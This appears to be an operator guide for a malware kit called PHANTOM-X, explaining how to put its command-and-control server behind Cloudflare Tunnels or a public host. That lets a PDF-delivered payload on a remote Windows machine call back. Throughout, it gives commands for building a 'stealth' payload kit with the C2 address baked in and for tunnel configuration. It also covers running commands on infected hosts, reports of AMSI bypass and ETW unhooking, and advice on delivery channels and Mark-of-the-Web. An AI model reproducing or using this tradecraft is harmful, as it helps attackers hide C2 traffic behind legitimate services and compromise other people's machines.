# PHANTOM-X :: putting the C2 behind a Cloudflare Tunnel

For testing the chain across the internet, when the C2 server is on the
operator's own machine and the payload lands on a Windows machine on
some other network.

---

## The catch, before anything else

The payload's transport is **raw TCP**. It opens a socket and speaks a
line protocol on it.

Cloudflare Tunnel's edge speaks **HTTP and HTTPS** to the outside
world. That is what a tunnel is: the client (`cloudflared`) dials out to
Cloudflare's edge, and the edge forwards traffic to it.

So a raw-TCP C2 and a Cloudflare Tunnel do not meet on their own. There
are three ways to make them meet, and they differ in **what has to exist
on the far machine**:

| Path | Far machine needs | Raw TCP unchanged? | Cost |
|---|---|---|---|
| **A** -- the payload speaks HTTP to the tunnel | **nothing** -- only the PDF | no | free |
| **B** -- `cloudflared access tcp` on the far machine | `cloudflared` running | yes | free |
| **C** -- the C2 on a public host with the port open | **nothing** -- only the PDF | yes | a few dollars a month |

The requirement "only the PDF crosses the network" is satisfied by
**A** and **C**, and not by **B**.

---

## Getting cloudflared

```powershell
# the Windows build, no installer
Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" `
    -OutFile "$env:LOCALAPPDATA\cloudflared.exe"

& "$env:LOCALAPPDATA\cloudflared.exe" --version
```

Put it on the PATH if you want to call it by name:

```powershell
$dir = "$env:LOCALAPPDATA"
[Environment]::SetEnvironmentVariable("Path", [Environment]::GetEnvironmentVariable("Path","User") + ";$dir", "User")
```

---

## Path C -- the C2 on a public host (the simplest, and it is what
## most of the lab will use

A small public host with a port open. Nothing has to be installed on the
far machine, the raw TCP protocol is unchanged, and the server stays up
whether the operator's laptop is open or not.

**On the public host:**

```bash
./px_c2 --host 0.0.0.0 --port 9001 --log c2_audit.jsonl --idle 10m
```

```bash
# open the port
ufw allow 9001/tcp
```

**Here, at build time**, the C2 address is the public one:

```powershell
cd phase3_fileless\loader
.\make_remote_kit.ps1 -C2Host your-host.example -C2Port 9001 -Arm stealth
```

**On the far machine:** only the PDF. Nothing else.

**The cost:** a host that is publicly reachable is a host that other
people can reach as well. That is worth remembering before pointing a C2
at the open internet, and it is why the lab's own rules keep the
endpoints operator-named.

---

## Path B -- the tunnel, with the raw TCP protocol unchanged

### On the C2 side

```powershell
# a quick tunnel: no account, a random hostname, and it is gone when
# the process stops
& "$env:LOCALAPPDATA\cloudflared.exe" tunnel --url tcp://localhost:9001
```

```
2024-01-01T00:00:00Z INF |  https://random-words-here.trycloudflare.com  ->
your-tunnel
```

That hostname is the C2 address, and it goes into the kit:

```powershell
.\make_remote_kit.ps1 -C2Host random-words-here.trycloudflare.com -C2Port 9001 -Arm stealth
```

### On the far machine

`cloudflared access tcp` turns the tunnel hostname back into a local
TCP port, which is what the payload talks to:

```powershell
& "$env:LOCALAPPDATA\cloudflared.exe" access tcp `
    --hostname random-words-here.trycloudflare.com `
    --url 127.0.0.1:9001
```

The payload's address is then `127.0.0.1:9001`, and `cloudflared` on
the far machine carries it to the tunnel.

**This is one more program on the far machine.** It joins the loader in
the "one-time setup" column, and the PDF is still the only thing that
crosses the network for every test.

### A named tunnel, if the hostname should not change

A quick tunnel's hostname changes every time it starts, which means the
kit has to be rebuilt every time. A named tunnel has a fixed hostname,
and it needs a domain on Cloudflare:

```bash
cloudflared tunnel login
cloudflared tunnel create px-lab
cloudflared tunnel route dns px-lab c2.yourdomain.example
```

```yaml
# ~/.cloudflared/config.yml
tunnel: px-lab
credentials-file: /home/user/.cloudflared/<id>.json
ingress:
  - service: tcp://localhost:9001
  - service: http_status:404
```

```bash
cloudflared tunnel run px-lab
```

**Note the ingress rule.** A tunnel that forwards arbitrary TCP is a
tunnel that forwards arbitrary TCP: anyone who finds the hostname can
connect to whatever is behind it. If the thing behind it is a lab C2
that is bound to nothing else, that is the intended shape -- but it is
worth being deliberate about it.

---

## Path A -- the payload speaks HTTP, so the far machine needs nothing

This is the one that makes "only the PDF crosses the network" literally
true, with no tunnel client and no public host.

The idea is small: the payload sends its protocol lines as the body of
an HTTP request, and reads the response. The tunnel is then an ordinary
HTTP endpoint, and Cloudflare's edge terminates it without the far
machine knowing anything happened.

**On the C2 side**, with no client on the far machine at all:

```powershell
& "$env:LOCALAPPDATA\cloudflared.exe" tunnel --url http://localhost:9001
```

**On the far machine:** nothing but the PDF. The payload resolves the
tunnel's hostname and posts to it.

**What it costs in the lab:** the payload needs an HTTP transport mode
alongside the raw TCP one, and the server needs to parse it. That is
work in `px_payload.c` and `c2_server.go`, and it changes the wire
format, so the two sides have to be built together.

**What it buys:** the far machine is clean. No loader, no tunnel client,
no public host. The PDF is the whole delivery.

---

## The Mark-of-the-Web, either way

A document that arrived from the internet has the mark on it, and that
is true whichever path is used. It is not a problem to solve -- it is a
variable to measure.

The same PDF, sent two ways, produces two different results, and the
difference is a finding:

- **sent by mail or a chat client** -- the mark is on, the download
  reputation is unknown, and a mail gateway may strip the document
  before it ever arrives
- **copied by hand** -- no mark, and the endpoint sees a file that has
  never been seen before

Record which one was used. The lab's whole method depends on knowing
what was different.

---

## What to watch while the test runs

On the C2 side:

```
c2> list
c2> exec 1 whoami
c2> cap 1 avstatus
```

`avstatus` is the important one. It reports what the payload can see of
the endpoint it landed on:

```
endpoint posture: amsi_bypass=not patched etw_unhook=patched
realtime_protection=on self_excluded=no elevated=yes endpoint_filter=absent
```

A session that appears and then behaves oddly is usually the endpoint
having done something, and `avstatus` is what says what.

**And remember the twenty-second delay** in the stealth arm: the first
connection does not happen immediately, and a test that waits five
seconds will conclude that nothing happened.
